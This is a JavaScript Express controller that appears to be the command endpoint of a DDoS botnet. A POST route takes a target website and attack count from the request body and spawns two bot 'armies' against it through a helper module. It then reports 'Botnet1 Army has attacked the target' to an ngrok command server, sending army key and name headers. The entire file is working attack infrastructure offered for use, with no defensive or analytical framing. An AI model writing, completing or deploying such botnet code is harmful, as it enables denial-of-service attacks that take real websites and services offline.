const axios = require('axios')
const armyBot = require('../utils/army')

class ControlControllers {

    // [GET] /
    index(req ,res, next) {
        res.status(200).json({
            status: 'Access Successfully',
            message: 'Welcome come back! Commander'
        })
    }

    // [POST] /
    async attackCommand(req, res, next) {
        try {
           const {websiteTarget, numberDos} = req.body
           res.end('OK! Start attacking target...')
           console.log(process.env.URL_NGROK);

            await Promise.all([
               armyBot.createArmy(websiteTarget, 25, numberDos),
               armyBot.createArmy(websiteTarget, 25, numberDos),
            ])
            
            const response = await axios({
                method: 'post',
                url: process.env.URL_NGROK,
                headers: {
                    'X-Botnet-Army-Key': process.env.ARMY_KEY,
                    'X-Botnet-Army-Name': process.env.ARMY_NAME
                },
                data: {
                    messageBotnetArmy: 'Botnet1 Army has attacked the target.'
                }
            })

            console.log('Attacked done')

        } catch (error) {
            console.log(error);
        }
    }

}

module.exports = new ControlControllers